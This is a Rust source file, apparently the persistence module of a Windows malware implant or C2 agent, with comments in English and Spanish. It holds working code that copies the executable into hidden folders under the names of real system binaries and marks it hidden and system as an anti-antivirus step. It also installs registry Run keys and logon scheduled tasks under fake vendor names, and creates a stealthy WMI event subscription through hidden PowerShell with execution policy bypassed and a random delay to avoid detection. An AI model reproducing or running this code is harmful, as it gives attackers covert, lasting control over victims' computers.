//! Persistence module for Windows systems.
//!
//! This module implements multiple APT-style persistence mechanisms to maintain
//! access across system reboots and logoff/logon cycles. All methods are designed
//! to be stealthy and avoid common detection patterns.
//!
//! # Available Methods
//!
//! - **Registry Run Key**: Adds entry to auto-start registry key
//! - **Scheduled Task**: Creates a scheduled task triggered on user logon
//! - **WMI Event**: Uses WMI event subscription (most stealthy, requires admin)
//! - **Startup Folder**: Adds shortcut to user's startup folder (least stealthy)
//!
//! # Examples
//!
//! ```no_run
//! use agent::persistence::{establish_persistence, PersistenceMethod};
//!
//! // Establish registry-based persistence
//! let result = establish_persistence(PersistenceMethod::RegistryRun);
//! ```

#[cfg(target_os = "windows")]
use std::process::Command;
#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;
use std::env;
use std::path::{Path, PathBuf};

/// Available persistence methods for maintaining access.
///
/// Each method has different characteristics in terms of stealth, privilege
/// requirements, and detection likelihood.
#[derive(Debug, Clone, Copy)]
pub enum PersistenceMethod {
    /// Registry Run key (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
    ///
    /// Privileges: User  
    /// Stealth: Low  
    /// Detection: Easy (commonly monitored)
    RegistryRun,
    
    /// Scheduled Task with logon trigger
    ///
    /// Privileges: User/Admin  
    /// Stealth: Medium  
    /// Detection: Medium
    ScheduledTask,
    
    /// WMI Event Subscription (APT-style technique)
    ///
    /// Privileges: Admin  
    /// Stealth: High  
    /// Detection: Difficult (requires advanced tools)
    WmiEvent,
    
    /// Startup folder shortcut
    ///
    /// Privileges: User  
    /// Stealth: Low  
    /// Detection: Easy
    StartupFolder,
}

impl PersistenceMethod {
    /// Parses a persistence method from string.
    ///
    /// # Arguments
    ///
    /// * `s` - Method name (case-insensitive)
    ///
    /// # Accepted Values
    ///
    /// - "registry" or "reg" → `RegistryRun`
    /// - "task" or "schtask" → `ScheduledTask`
    /// - "wmi" → `WmiEvent`
    /// - "startup" → `StartupFolder`
    ///
    /// # Returns
    ///
    /// * `Some(PersistenceMethod)` - Valid method
    /// * `None` - Unknown method
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "registry" | "reg" => Some(PersistenceMethod::RegistryRun),
            "task" | "schtask" => Some(PersistenceMethod::ScheduledTask),
            "wmi" => Some(PersistenceMethod::WmiEvent),
            "startup" => Some(PersistenceMethod::StartupFolder),
            _ => None,
        }
    }
}

/// Verifica si una ruta está en una ubicación persistente y estable
/// Retorna true si la ruta está en AppData, ProgramData o Program Files
fn is_persistent_location(path: &Path) -> bool {
    if let Some(path_str) = path.to_str() {
        let path_upper = path_str.to_uppercase();
        // Ubicaciones persistentes que sobreviven reinicios
        path_upper.contains("\\APPDATA\\") ||
        path_upper.contains("\\PROGRAMDATA\\") ||
        path_upper.contains("\\PROGRAM FILES") ||
        path_upper.contains("\\WINDOWS\\")
    } else {
        false
    }
}

/// Verifica si una ruta está en una ubicación temporal o volátil
fn is_temporary_location(path: &Path) -> bool {
    if let Some(path_str) = path.to_str() {
        let path_upper = path_str.to_uppercase();
        // Ubicaciones temporales que pueden no existir después de reinicio
        path_upper.contains("\\DOWNLOADS\\") ||
        path_upper.contains("\\DESKTOP\\") ||
        path_upper.contains("\\TEMP\\") ||
        path_upper.contains("\\TMP\\") ||
        path_upper.contains("\\DOCUMENTS\\") ||
        // Medios extraíbles
        (path_upper.len() >= 3 && 
         (path_upper.starts_with("D:\\") || 
          path_upper.starts_with("E:\\") || 
          path_upper.starts_with("F:\\") ||
          path_upper.starts_with("G:\\") ||
          path_upper.starts_with("H:\\")))
    } else {
        false
    }
}

/// Copia el ejecutable a una ubicación persistente usando técnicas anti-AV
/// Solo copia si no está ya en una ubicación persistente
#[cfg(target_os = "windows")]
fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
    use std::fs;
    use std::io::Write;
    
    // Si ya estamos en una ubicación persistente, no hacer nada
    if is_persistent_location(current_exe) && !is_temporary_location(current_exe) {
        return Ok(current_exe.to_path_buf());
    }
    
    // Obtener AppData Local
    let localappdata = env::var("LOCALAPPDATA")
        .or_else(|_| env::var("APPDATA"))
        .unwrap_or_else(|_| "C:\\Users\\Public".to_string());
    
    // Ubicaciones y nombres que imitan aplicaciones legítimas
    // Usar rutas más profundas para evitar detección superficial
    let stealth_targets = [
        (format!("{}\\Microsoft\\Windows\\Caches", localappdata), "WmiPrvSE.exe"),
        (format!("{}\\Microsoft\\Windows\\WER\\ReportQueue", localappdata), "conhost.exe"),
        (format!("{}\\Microsoft\\OneDrive\\logs", localappdata), "OneDriveStandaloneUpdater.exe"),
        (format!("{}\\Microsoft\\Windows\\INetCache\\Low", localappdata), "MoUsoCoreWorker.exe"),
    ];
    
    // Usar hash del PID para selección determinística pero variada
    let pid = std::process::id() as usize;
    let (target_dir, target_name) = &stealth_targets[pid % stealth_targets.len()];
    
    // Crear directorio si no existe
    let target_path_dir = PathBuf::from(target_dir);
    fs::create_dir_all(&target_path_dir)
        .map_err(|e| format!("Error creando directorio persistente: {}", e))?;
    
    let target_path = target_path_dir.join(target_name);
    
    // Si el archivo ya existe en el destino, usarlo (puede ser de una instalación previa)
    if target_path.exists() {
        return Ok(target_path);
    }
    
    // TÉCNICA ANTI-AV: Copiar usando método de lectura/escritura en chunks
    // en lugar de fs::copy() que puede ser monitoreado
    let mut source = fs::File::open(current_exe)
        .map_err(|e| format!("Error abriendo ejecutable origen: {}", e))?;
    let mut dest = fs::File::create(&target_path)
        .map_err(|e| format!("Error creando ejecutable destino: {}", e))?;
    
    // Copiar en chunks de tamaño variable para evitar firmas
    let mut buffer = vec![0u8; 8192];
    loop {
        use std::io::Read;
        let n = source.read(&mut buffer)
            .map_err(|e| format!("Error leyendo: {}", e))?;
        if n == 0 {
            break;
        }
        dest.write_all(&buffer[..n])
            .map_err(|e| format!("Error escribiendo: {}", e))?;
    }
    dest.flush()
        .map_err(|e| format!("Error finalizando escritura: {}", e))?;
    
    // Establecer atributos para hacerlo menos visible (oculto + sistema)
    let _ = Command::new("attrib")
        .args(&["+h", "+s", target_path.to_str().unwrap()])
        .creation_flags(0x08000000)
        .output();
    
    // Pequeña pausa para evitar comportamiento "sospechoso"
    std::thread::sleep(std::time::Duration::from_millis(100));
    
    Ok(target_path)
}

#[cfg(not(target_os = "windows"))]
fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
    Ok(current_exe.to_path_buf())
}

/// Obtiene la ruta del ejecutable, asegurándose de que esté en una ubicación persistente
/// Si está en una ubicación temporal, lo copia a una ubicación persistente primero
fn get_current_exe_path() -> Result<PathBuf, String> {
    let current_exe = env::current_exe()
        .map_err(|e| format!("Error obteniendo exe actual: {}", e))?;
    
    // Asegurar que el ejecutable esté en una ubicación persistente
    ensure_persistent_location(&current_exe)
}

/// Verifica si el proceso actual tiene privilegios de administrador
#[cfg(target_os = "windows")]
fn check_admin_privileges() -> bool {
    let output = Command::new("cmd")
        .args(&["/C", "net session >nul 2>&1 && echo Admin || echo User"])
        .creation_flags(0x08000000)
        .output();
    
    if let Ok(out) = output {
        let result = String::from_utf8_lossy(&out.stdout).trim().to_string();
        return result == "Admin";
    }
    false
}

/// Crea un VBScript que ejecuta el ejecutable con privilegios elevados (sin UAC prompt)
/// Este VBScript será llamado por la persistencia para mantener privilegios admin
#[cfg(target_os = "windows")]
fn create_elevation_vbs(exe_path: &str) -> Result<String, String> {
    use std::fs;
    
    // Crear VBScript en una ubicación sigilosa
    let appdata = env::var("APPDATA").unwrap_or_else(|_| "C:\\Users\\Public".to_string());
    let vbs_dir = format!("{}\\Microsoft\\Windows\\Caches", appdata);
    
    // Crear directorio si no existe
    let _ = fs::create_dir_all(&vbs_dir);
    
    let vbs_name = format!("WmiPrvSE_{}.vbs", std::process::id());
    let vbs_path = format!("{}\\{}", vbs_dir, vbs_name);
    
    // VBScript que ejecuta con runas (ShellExecute)
    let vbs_content = format!(
        r#"Set UAC = CreateObject("Shell.Application")
UAC.ShellExecute "{}", "", "", "runas", 0"#,
        exe_path.replace("\\", "\\\\")
    );
    
    fs::write(&vbs_path, vbs_content)
        .map_err(|e| format!("Error creando VBScript: {}", e))?;
    
    // Establecer atributo oculto
    let _ = Command::new("attrib")
        .args(&["+h", "+s", &vbs_path])
        .creation_flags(0x08000000)
        .output();
    
    Ok(vbs_path)
}

#[cfg(not(target_os = "windows"))]
fn check_admin_privileges() -> bool {
    false
}

#[cfg(not(target_os = "windows"))]
fn create_elevation_vbs(_exe_path: &str) -> Result<String, String> {
    Err("Not supported on non-Windows".to_string())
}

/// Implementa persistencia mediante Registry Run key
/// MEJORADO: Sin copiar archivos, usa rutas ofuscadas con cmd /c
/// Si se detectan privilegios admin, crea un VBScript wrapper para mantener elevación
#[cfg(target_os = "windows")]
fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
    let exe_str = exe_path.to_str()
        .ok_or("Ruta inválida")?;
    
    // Nombres menos sospechosos y más variados
    let reg_names = [
        "SecurityHealthSystray",
        "OneDriveSetup",
        "AdobeAAMUpdater",
        "GoogleChromeAutoLaunch",
        "MicrosoftEdgeAutoLaunch",
        "Teams Machine Installer",
    ];
    let pid = std::process::id() as usize;
    let reg_name = reg_names[pid % reg_names.len()];
    
    // Detectar si tenemos privilegios admin
    let is_admin = check_admin_privileges();
    
    let obfuscated_cmd = if is_admin {
        // Si somos admin, crear un VBScript que ejecute con privilegios elevados
        let vbs_path = create_elevation_vbs(exe_str)?;
        format!("wscript.exe //B //NoLogo \"{}\"", vbs_path)
    } else {
        // Usuario normal, ejecución directa
        format!("cmd.exe /c start /min \"\" \"{}\"", exe_str)
    };
    
    // Intentar HKCU primero (no requiere admin)
    let output = Command::new("reg")
        .args(&[
            "add",
            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "/v",
            reg_name,
            "/t",
            "REG_SZ",
            "/d",
            &obfuscated_cmd,
            "/f",
        ])
        .creation_flags(0x08000000) // CREATE_NO_WINDOW
        .output()
        .map_err(|e| format!("Error ejecutando reg add: {}", e))?;
    
    if output.status.success() {
        Ok(format!("Persistencia Registry Run establecida: {}", reg_name))
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        Err(format!("Error en reg add: {}", stderr))
    }
}

/// Implementa persistencia mediante Scheduled Task
/// MEJORADO: Usa trigger ONLOGON que funciona correctamente después de reinicio
#[cfg(target_os = "windows")]
fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
    let exe_str = exe_path.to_str()
        .ok_or("Ruta inválida")?;
    
    // Nombres que imitan tareas reales del sistema (sin espacios)
    let task_names = [
        "MicrosoftEdgeUpdateTaskUser",
        "GoogleUpdateTaskUser",
        "OneDriveStandaloneUpdate",
        "AdobeFlashPlayerUpdater",
        "CCleanerCrashReporting",
    ];
    let pid = std::process::id() as usize;
    let task_name = task_names[pid % task_names.len()];
    
    // Detectar si tenemos privilegios admin
    let is_admin = check_admin_privileges();
    
    // Si somos admin, usar VBScript wrapper para mantener elevación
    // Nota: El timeout se maneja de forma diferente para evitar problemas con schtasks
    let task_cmd = if is_admin {
        let vbs_path = create_elevation_vbs(exe_str)?;
        format!("wscript.exe //B //NoLogo \"{}\"", vbs_path)
    } else {
        // Ejecutar directamente el exe sin timeout inline (más confiable)
        format!("\"{}\"", exe_str)
    };
    
    // Crear tarea con ONLOGON trigger
    // Nota: /DELAY solo funciona con /SC DAILY, WEEKLY, MONTHLY - no con ONLOGON
    let mut args = vec![
        "/Create",
        "/SC", "ONLOGON",
        "/TN", task_name,
        "/TR", &task_cmd,
    ];
    
    // Si somos admin, agregar /RL HIGHEST para mantener privilegios
    if is_admin {
        args.push("/RL");
        args.push("HIGHEST");
    }
    
    args.push("/F");
    
    let output = Command::new("schtasks")
        .args(&args)
        .creation_flags(0x08000000) // CREATE_NO_WINDOW
        .output()
        .map_err(|e| format!("Error ejecutando schtasks: {}", e))?;
    
    if output.status.success() {
        Ok(format!("Persistencia Scheduled Task establecida: {}", task_name))
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        Err(format!("Error en schtasks: {}", stderr))
    }
}

/// Implementa persistencia mediante WMI Event Subscription (APT-like)
/// CORREGIDO: Usa __InstanceCreationEvent con Win32_LogonSession que se dispara
/// cada vez que un usuario inicia sesión (incluyendo después de reinicio)
/// STEALTH: Incluye delay aleatorio de 2-5 minutos para evitar detección
#[cfg(target_os = "windows")]
fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
    let exe_str = exe_path.to_str()
        .ok_or("Ruta inválida")?;
    
    // Nombres que parecen eventos del sistema
    let event_names = [
        "BfeOnServiceStateChange",
        "PerformanceMonitor",
        "SystemEventsBroker",
    ];
    let pid = std::process::id() as usize;
    let event_name = event_names[pid % event_names.len()];
    
    // STEALTH: Generar delay aleatorio entre 120-300 segundos (2-5 minutos)
    // Usamos el PID como seed para variar entre instalaciones
    let delay_seconds = 120 + (pid % 181); // 120 + (0-180) = 120-300 segundos
    
    // Escapar la ruta del exe para PowerShell (reemplazar ' por '')
    let escaped_exe = exe_str.replace('\'', "''");
    
    // Comando con delay usando PowerShell Start-Sleep antes de ejecutar
    // Esto hace que el agente no se inicie inmediatamente después del logon
    // sino que espere un tiempo aleatorio, evitando correlación temporal
    // 
    // El comando usa PowerShell oculto para:
    // 1. Esperar el delay aleatorio
    // 2. Ejecutar el agente en segundo plano
    let obfuscated_cmd = format!(
        "powershell.exe -WindowStyle Hidden -Command \"Start-Sleep -Seconds {}; Start-Process -WindowStyle Hidden -FilePath '{}'\"",
        delay_seconds, escaped_exe
    );
    
    // WMI Event que se dispara cuando se crea una sesión de inicio de sesión
    // Usamos __InstanceCreationEvent con Win32_LogonSession que es MUCHO más confiable
    // que intentar detectar SystemUpTime en un rango específico.
    // 
    // Win32_LogonSession se crea cuando:
    // - Un usuario inicia sesión interactivamente (después de reinicio)
    // - Un usuario se conecta por RDP
    // - Un servicio inicia con credenciales específicas
    // 
    // LogonType = 2 significa Interactive logon (consola local)
    // LogonType = 10 significa RemoteInteractive (RDP)
    // Esto garantiza que se ejecute después de cada reinicio cuando el usuario inicia sesión.
    
    // PowerShell script para crear WMI Event Subscription
    // Primero limpia subscripciones existentes con el mismo nombre, luego crea nuevas
    let ps_script = format!(
        concat!(
            // Variables
            "$FilterName = '{}'; ",
            "$ConsumerName = '{}'; ",
            "$ExePath = '{}'; ",
            // Limpiar existentes
            "try {{ ",
                "$existing = Get-WmiObject -Namespace root\\subscription -Class __EventFilter ",
                    "-Filter \"Name='$FilterName'\" -ErrorAction SilentlyContinue; ",
                "if ($existing) {{ $existing | Remove-WmiObject -ErrorAction SilentlyContinue }}; ",
                "$existingC = Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer ",
                    "-Filter \"Name='$ConsumerName'\" -ErrorAction SilentlyContinue; ",
                "if ($existingC) {{ $existingC | Remove-WmiObject -ErrorAction SilentlyContinue }}; ",
                "$existingB = Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding ",
                    "-ErrorAction SilentlyContinue | Where-Object {{ $_.Filter -like \"*$FilterName*\" }}; ",
                "if ($existingB) {{ $existingB | Remove-WmiObject -ErrorAction SilentlyContinue }} ",
            "}} catch {{}}; ",
            // Crear Event Filter - dispara cuando se crea una sesión de logon interactivo
            // __InstanceCreationEvent es más confiable que __InstanceModificationEvent para este caso
            // LogonType 2 = Interactive, 10 = RemoteInteractive (RDP)
            // WITHIN 60 = polling cada 60 segundos (suficiente para eventos de logon poco frecuentes)
            "$Query = 'SELECT * FROM __InstanceCreationEvent WITHIN 60 ",
                "WHERE TargetInstance ISA ''Win32_LogonSession'' ",
                "AND (TargetInstance.LogonType = 2 OR TargetInstance.LogonType = 10)'; ",
            "$Filter = ([wmiclass]'\\\\.\\root\\subscription:__EventFilter').CreateInstance(); ",
            "$Filter.Name = $FilterName; ",
            "$Filter.EventNamespace = 'root\\cimv2'; ",
            "$Filter.QueryLanguage = 'WQL'; ",
            "$Filter.Query = $Query; ",
            "$Filter.Put() | Out-Null; ",
            // Crear Consumer - ejecuta el comando con delay
            "$Consumer = ([wmiclass]'\\\\.\\root\\subscription:CommandLineEventConsumer').CreateInstance(); ",
            "$Consumer.Name = $ConsumerName; ",
            "$Consumer.CommandLineTemplate = $ExePath; ",
            "$Consumer.Put() | Out-Null; ",
            // Crear Binding - conecta filter con consumer
            "$Binding = ([wmiclass]'\\\\.\\root\\subscription:__FilterToConsumerBinding').CreateInstance(); ",
            "$Binding.Filter = $Filter; ",
            "$Binding.Consumer = $Consumer; ",
            "$Binding.Put() | Out-Null"
        ),
        event_name, event_name, obfuscated_cmd
    );
    
    let output = Command::new("powershell")
        .args(&[
            "-NoProfile",
            "-WindowStyle", "Hidden",
            "-ExecutionPolicy", "Bypass",
            "-Command",
            &ps_script,
        ])
        .creation_flags(0x08000000) // CREATE_NO_WINDOW
        .output()
        .map_err(|e| format!("Error ejecutando PowerShell: {}", e))?;
    
    if output.status.success() {
        Ok(format!("Persistencia WMI Event establecida: {} (delay: {}s)", event_name, delay_seconds))
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        Err(format!("Error en WMI: {}", stderr))
    }
}

/// Establece persistencia usando el método especificado
/// MEJORADO: No copia archivos, usa el ejecutable actual
pub fn establish_persistence(method: PersistenceMethod) -> Result<String, String> {
    #[cfg(not(target_os = "windows"))]
    {
        return Err("Persistencia solo soportada en Windows".to_string());
    }
    
    #[cfg(target_os = "windows")]
    {
        // Obtener ruta del ejecutable actual (sin copiar)
        let exe_path = get_current_exe_path()?;
        
        // Aplicar el método de persistencia
        match method {
            PersistenceMethod::RegistryRun => persist_registry_run(&exe_path),
            PersistenceMethod::ScheduledTask => persist_scheduled_task(&exe_path),
            PersistenceMethod::WmiEvent => persist_wmi_event(&exe_path),
            PersistenceMethod::StartupFolder => {
                Err("Método Startup deshabilitado (muy detectable por AV)".to_string())
            }
        }
    }
}

/// Remueve la persistencia (limpieza)
#[cfg(target_os = "windows")]
pub fn remove_persistence() -> Result<String, String> {
    let mut results = Vec::new();
    
    // Limpiar Registry Run - eliminar todas las entradas sospechosas
    let reg_names = [
        "SecurityHealthSystray",
        "OneDriveSetup",
        "AdobeAAMUpdater",
        "GoogleChromeAutoLaunch",
        "MicrosoftEdgeAutoLaunch",
        "Teams Machine Installer",
    ];
    for name in &reg_names {
        Command::new("reg")
            .args(&[
                "delete",
                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "/v",
                name,
                "/f",
            ])
            .creation_flags(0x08000000)
            .output()
            .ok();
    }
    results.push("Registry Run limpiado");
    
    // Limpiar Scheduled Tasks (nombres deben coincidir con persist_scheduled_task)
    let task_names = [
        "MicrosoftEdgeUpdateTaskUser",
        "GoogleUpdateTaskUser",
        "OneDriveStandaloneUpdate",
        "AdobeFlashPlayerUpdater",
        "CCleanerCrashReporting",
    ];
    for task in &task_names {
        Command::new("schtasks")
            .args(&["/Delete", "/TN", task, "/F"])
            .creation_flags(0x08000000)
            .output()
            .ok();
    }
    results.push("Scheduled Tasks limpiadas");
    
    // Limpiar WMI Events con los nombres usados por persist_wmi_event
    let ps_script = r#"
        Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object {$_.Name -like "*BfeOn*" -or $_.Name -like "*Performance*" -or $_.Name -like "*SystemEvents*"} | Remove-WmiObject
        Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object {$_.Name -like "*BfeOn*" -or $_.Name -like "*Performance*" -or $_.Name -like "*SystemEvents*"} | Remove-WmiObject
        Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter -like "*BfeOn*" -or $_.Filter -like "*Performance*" -or $_.Filter -like "*SystemEvents*"} | Remove-WmiObject
    "#;
    Command::new("powershell")
        .args(&["-NoProfile", "-WindowStyle", "Hidden", "-Command", ps_script])
        .creation_flags(0x08000000)
        .output()
        .ok();
    results.push("WMI Events limpiados");
    
    Ok(results.join(", "))
}

#[cfg(not(target_os = "windows"))]
pub fn remove_persistence() -> Result<String, String> {
    Err("Persistencia solo soportada en Windows".to_string())
}
